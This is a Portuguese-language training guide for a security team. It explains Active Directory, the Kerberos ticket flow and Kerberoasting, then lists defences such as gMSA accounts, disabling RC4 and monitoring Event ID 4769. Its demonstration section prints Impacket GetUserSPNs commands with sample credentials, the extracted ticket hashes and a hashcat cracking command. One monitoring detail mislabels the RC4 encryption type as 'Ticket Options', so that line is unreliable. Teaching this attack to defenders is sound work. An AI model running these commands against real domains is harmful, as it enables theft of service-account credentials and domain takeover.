# Guia 07 — Active Directory: Domain Controllers, Kerberos e Kerberoasting
**Ciclo de Capacitação 2026.2 — Cyberguard Hub & Dojo pwn.college**  
**Classificação:** Educacional / Técnico  
**Público-Alvo:** Integrantes da Cyberguard (Foco em Infraestrutura Corporativa e Red Team)

---

## 1. Introdução e o Cenário no Diagnóstico

Mais de **90% das grandes empresas mundiais** utilizam o **Active Directory (AD)** da Microsoft para gerenciar identidades, computadores e permissões corporativas.

No teste diagnóstico da Cyberguard, a área de Active Directory apresentou uma defasagem expressiva:
* **62,5% da equipe errou a função básica de um Domain Controller (DC)**.
* **75% da equipe (6 de 8 membros) não soube explicar o ataque de Kerberoasting**, confundindo-o até mesmo com negação de serviço em servidores DNS.

Dominar o Active Directory é essencial tanto para o **Red Team** (movimentação lateral e escalação de privilégios para *Domain Admin*) quanto para o **Blue Team** (auditoria de identidades e detecção de anomalias no tráfego Kerberos).

---

## 2. A Arquitetura do Active Directory

O Active Directory é um serviço de diretório que centraliza a gestão de todos os recursos de uma organização em um único domínio lógico (ex: `corp.cyberguard.local`).

```
                              [ DOMAIN CONTROLLER (DC) ]
                            ┌────────────────────────────┐
                            │ - Banco Central: NTDS.dit   │
                            │ - Autenticação: Kerberos/KDC│
                            │ - Políticas: GPOs           │
                            │ - Diretório: LDAP           │
                            └──────────────┬─────────────┘
                                           │
         ┌─────────────────────────────────┼─────────────────────────────────┐
         │                                 │                                 │
         ▼                                 ▼                                 ▼
[ Servidor de Banco ]            [ Servidor Web IIS ]             [ Workstations ]
 MSSQL / SPN Configurado          SharePoint / Intranet            Computadores de Funcionários
```

### 2.1 O Papel do Domain Controller (DC)
O **Domain Controller (DC)** é o servidor mestre da rede corporativa. Ele é responsável por:
1. **Autenticação e Autorização:** Validar as credenciais de qualquer usuário ou máquina que tente acessar recursos no domínio.
2. **Distribuição de Políticas de Grupo (GPO):** Aplicar configurações de segurança e restrições automaticamente em milhares de computadores.
3. **Armazenamento da Base `NTDS.dit`:** O arquivo `C:\Windows\NTDS\NTDS.dit` é a base de dados central do AD. Ele armazena todos os objetos do domínio, incluindo os **hashes NTLM das senhas de todos os usuários corporativos e administradores**. A obtenção do arquivo `NTDS.dit` por um atacante significa o comprometimento total e definitivo do domínio (*Full Domain Compromise*).

---

## 3. O Protocolo Kerberos e o Fluxo de Autenticação

Diferente de sistemas simples que enviam senhas pela rede, o Active Directory utiliza o protocolo criptográfico **Kerberos v5** baseado em tickets. 

O Domain Controller roda o serviço **KDC (Key Distribution Center)**, que se divide em duas partes: o **AS** (*Authentication Service*) e o **TGS** (*Ticket Granting Service*).

### O Fluxo Canônico em Quatro Etapas:

```
[ USUÁRIO (Alice) ]                [ DOMAIN CONTROLLER (KDC) ]         [ SERVIDOR ALVO (MSSQL) ]
        │                                        │                                │
        │ 1. AS-REQ (Pede TGT com timestamp)     │                                │
        ├───────────────────────────────────────>│                                │
        │                                        │                                │
        │ 2. AS-REP (Retorna TGT cifrado krbtgt) │                                │
        │<───────────────────────────────────────┤                                │
        │                                        │                                │
        │ 3. TGS-REQ (Apresenta TGT + pede SPN)  │                                │
        ├───────────────────────────────────────>│                                │
        │                                        │                                │
        │ 4. TGS-REP (Retorna Ticket de Serviço) │                                │
        │<───────────────────────────────────────┤                                │
        │                                                                         │
        │ 5. AP-REQ (Apresenta Ticket de Serviço para autenticar)                  │
        ├────────────────────────────────────────────────────────────────────────>│
```

1. **Passo 1 — `AS-REQ`:** Alice envia uma solicitação inicial de autenticação ao KDC contendo um carimbo de tempo cifrado com sua própria senha (pré-autenticação).
2. **Passo 2 — `AS-REP`:** O KDC valida o hash de Alice e devolve o **TGT (Ticket Granting Ticket)**. O TGT é cifrado com a chave da conta secreta do domínio chamada **`krbtgt`**. Ninguém, exceto o DC, consegue ler ou forjar o TGT!
3. **Passo 3 — `TGS-REQ`:** Alice deseja acessar o banco de dados MSSQL. Ela envia ao KDC o seu TGT válido junto com o nome do serviço desejado, chamado de **SPN (Service Principal Name)** (ex: `MSSQLSvc/sqlserver.corp.local:1433`).
4. **Passo 4 — `TGS-REP`:** O KDC valida o TGT e emite um **Ticket de Serviço (Ticket TGS)**.  
   **Atenção ao Ponto Crítico:** Esse ticket TGS é cifrado utilizando o **hash da senha da conta de serviço que roda o banco MSSQL**!
5. **Passo 5 — `AP-REQ`:** Alice apresenta o Ticket TGS ao servidor MSSQL. O servidor decifra o ticket com sua própria senha e concede o acesso a Alice.

---

## 4. A Anatomia do Ataque de Kerberoasting

O **Kerberoasting** (catalogado no MITRE ATT&CK como técnica **T1558.003**) é um dos ataques mais elegantes e letais contra ambientes Windows corporativos.

### 4.1 A Falha de Design Explorada
Para que o Kerberos funcione com conveniência:
> **Qualquer conta de usuário autenticada no domínio — mesmo o estagiário mais humilde ou uma conta comprometida sem privilégios — tem o direito legítimo de solicitar um ticket TGS para QUALQUER serviço que possua um SPN cadastrado!**

E mais: o Domain Controller **não verifica** se você realmente tem permissão de usar aquele serviço antes de emitir o ticket TGS. Ele simplesmente emite o ticket cifrado com o hash da conta dona do SPN.

### 4.2 O Vetor de Ataque Passo a Passo:

```
[ ATACANTE (Acesso comum) ]
     │
     │ 1. Consulta LDAP: "Quais contas de usuário têm SPNs configurados?"
     │ 2. Envia TGS-REQ para o SPN da conta alvo (ex: svc_sql)
     │ 3. Recebe TGS-REP cifrado com o hash NTLM da conta svc_sql
     │
[ MÁQUINA PESSOAL DO ATACANTE (OFFLINE) ]
     │
     │ 4. Extrai o blob cifrado do ticket TGS
     │ 5. Executa ataque de força bruta / dicionário com HASHCAT ou JOHN
     │    (Zero pacotes enviados para a rede da empresa! Zero risco de lockout!)
     │
[ RESULTADO: SENHA DA CONTA DE SERVIÇO DESCOBERTA EM TEXTO PURO! ]
```

Como contas de serviço frequentemente são inseridas em grupos privilegiados (como *Local Administrators* nos servidores ou até *Domain Admins*), quebrar essa senha garante acesso administrativo instantâneo.

---

## 5. Demonstração Prática de Kerberoasting

### 5.1 Extração com Impacket (`GetUserSPNs.py`)

A partir de uma máquina Linux no domínio com credenciais de qualquer usuário de baixo privilégio:

```bash
# Solicitar os tickets TGS e salvar no formato compatível com Hashcat:
GetUserSPNs.py corp.cyberguard.local/joao:Senha123! -dc-ip 10.10.10.10 -request -outputfile hashes_kerberos.txt
```

A saída exibe os serviços descobertos:
```
ServicePrincipalName                Name       MemberOf
---------------------------------   ---------  --------------------------
MSSQLSvc/sql.corp.local:1433        svc_sql    CN=Server Admins,...
HTTP/intranet.corp.local            svc_web    CN=Domain Users,...
```

O arquivo `hashes_kerberos.txt` conterá o ticket cifrado no formato:
```
$krb5tgs$23$*svc_sql$CORP.CYBERGUARD.LOCAL*$MSSQLSvc/sql.corp.local:1433*...$08b1a8f...
```

### 5.2 Quebra da Senha 100% Offline com Hashcat

O atacante transfere o arquivo para sua própria máquina (com GPU dedicada) e inicia a quebra de dicionário:

```bash
hashcat -m 13100 hashes_kerberos.txt rockyou.txt -o senhas_quebradas.txt
```
* `-m 13100`: Modo de hash do Kerberos 5 TGS-REP etype 23 (RC4).
* `rockyou.txt`: Wordlist clássica com milhões de senhas conhecidas.

Em poucos segundos, se a conta de serviço estiver utilizando uma senha comum (ex: `Database2024!`), o Hashcat encontra a chave exata!

---

## 6. Estratégias de Mitigação e Defesa

Como o Kerberoasting explora uma característica inerente do protocolo Kerberos, a defesa exige uma abordagem de endurecimento (*hardening*) de contas de serviço:

1. **Implementar gMSA (Group Managed Service Accounts):**  
   A solução definitiva da Microsoft. Contas gMSA possuem senhas aleatórias de **120 caracteres complexos**, rotacionadas automaticamente pelo próprio Active Directory periodicamente. Mesmo que o invasor capture o TGS, a quebra matemática por força bruta levaria séculos.
2. **Senhas Fortíssimas para SPNs Manuais:**  
   Se um sistema legado exigir uma conta de usuário tradicional com SPN, sua senha deve ter **no mínimo 25 a 30 caracteres aleatórios**, inviabilizando qualquer ataque de dicionário com Hashcat.
3. **Desabilitar a Cifragem RC4:**  
   Forçar o uso de **AES-128 e AES-256** no Kerberos (modificando o atributo `msDS-SupportedEncryptionTypes`). Tickets cifrados com AES demoram ordens de magnitude a mais para serem processados pelo Hashcat em comparação ao obsoleto RC4.
4. **Monitoramento Blue Team no SIEM:**  
   Monitorar o **Windows Event ID 4769** (*A Kerberos service ticket was requested*):
   * Disparar alertas caso um único usuário convencional solicite dezenas de tickets TGS em um curto intervalo de tempo.
   * Alertar requisições de tickets que solicitem explicitamente criptografia fraca RC4 (`Ticket Options: 0x17`).
